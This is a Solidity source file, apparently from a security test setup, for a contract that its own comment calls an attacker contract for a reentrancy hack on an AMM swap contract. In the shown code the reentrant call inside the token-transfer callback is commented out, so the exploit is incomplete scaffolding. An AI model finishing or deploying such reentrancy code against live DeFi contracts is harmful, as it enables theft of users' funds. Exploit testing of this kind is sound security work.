// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "woke/console.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface AMM {
    function swapExactIn(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 pairIdx
    ) external;

    function swapExactOut(
        address tokenIn,
        address tokenOut,
        uint256 amountOut,
        uint256 pairIdx
    ) external;
}

// this is an attacker contract to perform reentrancy hack on the AMM contract
contract AttackerContract is Ownable {
    address public ammContract;

    address public tokenA;
    address public tokenB;
    uint256 public amountIn;
    uint256 public pairIdx;
    bool public attacked;

    constructor(
        address _ammContract,
        address _tokenA,
        address _tokenB,
        uint256 _amountIn,
        uint256 _pairIdx
    ) {
        ammContract = _ammContract;
        tokenA = _tokenA;
        tokenB = _tokenB;
        amountIn = _amountIn;
        pairIdx = _pairIdx;
    }

    function attack(
        address _tokenIn,
        uint256 _amountIn,
        address _tokenOut,
        uint256 _pairIdx
    ) public payable {
        AMM amm = AMM(ammContract);
        amm.swapExactIn(_tokenIn, _amountIn, _tokenOut, _pairIdx);
    }

    function onTokenTransfer(address _to, uint256 _amount) external {
        // require(!attacked, "Already attacked");
        attacked = true;
        // AMM amm = AMM(ammContract);
        // amm.swapExactIn(tokenA, amountIn, tokenB, pairIdx);
    }

    function setMaxApproval(
        address receiver,
        address token
    ) external onlyOwner {
        IERC20(token).approve(receiver, type(uint256).max);
    }
}
